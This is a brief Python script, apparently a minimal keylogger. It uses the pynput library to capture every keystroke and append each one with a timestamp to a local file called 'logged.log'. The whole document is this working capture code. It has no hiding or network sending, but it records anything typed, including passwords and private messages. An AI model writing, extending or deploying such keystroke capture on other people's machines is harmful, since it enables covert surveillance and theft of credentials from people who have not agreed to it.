#!/usr/bin/python

from pynput.keyboard import Key, Listener
from datetime import datetime

"""
Logs typed keys to a local file
"""

def on_press(key):
    with open('logged.log', 'a') as f:
        f.write(f'{datetime.now()}: {key}')

def main():
    with Listener(on_press=on_press) as l:
        l.join()

if __name__ == '__main__':
    main()
